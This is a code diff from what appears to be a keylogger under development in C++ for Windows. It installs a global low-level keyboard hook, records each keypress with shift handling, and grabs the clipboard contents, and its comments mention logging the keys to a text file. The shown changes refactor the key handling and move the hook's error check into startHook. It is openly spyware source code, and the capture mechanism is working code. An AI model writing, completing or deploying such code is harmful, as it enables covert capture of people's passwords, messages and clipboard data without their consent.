@@ -32,19 +32,19 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	//shift handling handling here, we do not need to print anything :)
 
 	//we're gonna have to handle this a differnt way if we're actually going to log anything in a txt...
-	if (!(keyboardStruct->vkCode == 160 || keyboardStruct->vkCode == 161))
-	{
-		//CTRL handling here.
-		if (!(keyboardStruct->vkCode == 162 || keyboardStruct->vkCode == 163))
-		{
-			if (wparam == WM_KEYDOWN)
-			{
-				//handling code in here, all if-statements went through...
 
-				if (is_control_on) { std::cout << "CTRL + "; }
-				std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
-			}
-		}
+	auto vk = keyboardStruct->vkCode;
+
+	if (vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LCONTROL && vk != VK_RCONTROL && wparam == WM_KEYDOWN)
+	{
+		//if statements all went through. we can now run our funcs.
+
+		//don't know if we're actually going to handle control or not...
+		//if (is_control_on)
+		//	curCharStr += "c";
+
+		std::string curCharStr = std::to_string(handleCharsFinal(vk, is_shift_on));
+
 	}
 	
 	if (grabClipboard(storedClipboardContents))
@@ -57,26 +57,26 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(NULL, code, wparam, lparam);
 }
 
-#define test false;
-
 __forceinline void startHook()
 {
 	*handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
+	if (*handle_to_hook == NULL)
+	{
+		//masive error occurred here....
+		exit(-1);
+	}
 }
+
+#define test false;
 
 int main()
 {
 #if test
 
+
+
 #else
 	startHook();
-
-	//massive error occurs when initializing hook
-	if (*handle_to_hook == NULL)
-	{
-		std::cerr << "MASSIVE ERROR";
-		return 1;
-	}
 
 	//message handling (while this is running, the program is running)
 	MSG msg;
